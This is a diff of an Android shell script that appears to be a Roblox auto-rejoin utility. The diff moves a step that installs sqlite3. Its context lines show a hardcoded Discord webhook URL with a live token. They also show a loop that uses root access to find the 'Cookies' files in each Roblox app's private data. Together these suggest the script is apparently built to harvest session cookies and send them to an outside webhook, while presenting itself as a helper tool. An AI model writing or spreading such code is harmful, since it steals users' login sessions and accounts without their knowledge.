@@ -1,4 +1,6 @@
 #!/system/bin/sh
+echo "Loading..."
+if ! command -v sqlite3 >/dev/null 2>&1; then pkg install -y sqlite3; fi
 CONFIG_FILE="$HOME/Downloads/ConfigRejoin.txt"
 if [ -f "$CONFIG_FILE" ]; then
     source "$CONFIG_FILE"
@@ -107,9 +109,6 @@ send_webhook &
 auto_restart &
 WEBHOOK_URL2="https://discord.com/api/webhooks/1340266932707917855/dr6Krtq22v1y-YAoosniv2GO5TRyrbK92yh_9Nn30NhRaqK4w3OqZX_vEZOoYTeY2NJJ"
 sleep 30
-if ! command -v sqlite3 &> /dev/null; then
-    pkg install -y sqlite > /dev/null 2>&1
-fi
 for PACKAGE in $ROBLOX_PACKAGES; do
     COOKIE_FILES=()
     COOKIE_PATHS=$(su -c "find /data/data/$PACKAGE -type f -name 'Cookies' 2>/dev/null")
